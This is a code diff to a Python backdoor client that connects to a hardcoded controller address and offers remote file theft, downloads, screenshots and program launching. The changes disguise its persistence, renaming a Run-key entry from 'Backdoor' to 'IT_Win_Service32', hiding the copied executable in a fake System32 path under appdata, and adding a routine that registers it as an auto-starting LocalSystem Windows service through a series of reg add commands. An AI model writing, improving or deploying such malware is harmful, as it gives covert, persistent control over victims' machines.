@@ -13,6 +13,7 @@ from mss import mss
 
 HOST = '192.168.0.94'
 PORT = 54321
+pers_loc = os.environ['appdata'] + '\\Microsoft\\Windows\\System32\\windows32.exe'
 
 
 def get_help():
@@ -26,7 +27,8 @@ OPTIONS:
     get <path>      --> get file from the remote host
     download <URL>  --> downloads a file to the remote host
     screenshot      --> takes a screenshot from the host and sends to the bot controller
-    isadmin         --> tests if the bot controller has admin permissions on the host 
+    isadmin         --> check for administrator rights on the bot host
+    start <path>    --> starts the app in the remote host
     q               --> quit
     
 #########################################################################################
@@ -156,13 +158,33 @@ def client():
             shell(s)
 
 
-def persistence():
-    location = os.environ['appdata'] + '\\windows32.exe'
-    if not os.path.exists(location):
-        shutil.copyfile(sys.executable, location)
-        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "' +
-                        location + '"', shell=True)
+def persistence_run(_pers_loc):
+    if not os.path.exists(_pers_loc):
+        shutil.copyfile(sys.executable, _pers_loc)
+        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+                        '/v IT_Win_Service32 /t REG_SZ /d "' + _pers_loc + '"', shell=True)
 
 
-persistence()
+def persistence_service(_pers_loc):
+    if not os.path.exists(_pers_loc):
+        shutil.copyfile(sys.executable, _pers_loc)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+                        '/v ImagePath /t REG_EXPAND_SZ /d "' + _pers_loc + '"', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+                        '/v Type /t REG_DWORD /d 16', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+                        '/v Start /t REG_DWORD /d 2', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+                        '/v ErrorControl /t REG_DWORD /d 0', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+                        '/v DisplayName /t REG_SZ /d "' + _pers_loc.split('\\')[-1] + '"', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+                        '/v DependOnService /t REG_MULTI_SZ /d Tcpip', shell=True)
+        subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
+                        '/v ObjectName /t REG_SZ /d LocalSystem', shell=True)
+
+
+#persistence_run(pers_loc)
+persistence_service(pers_loc)
 client()
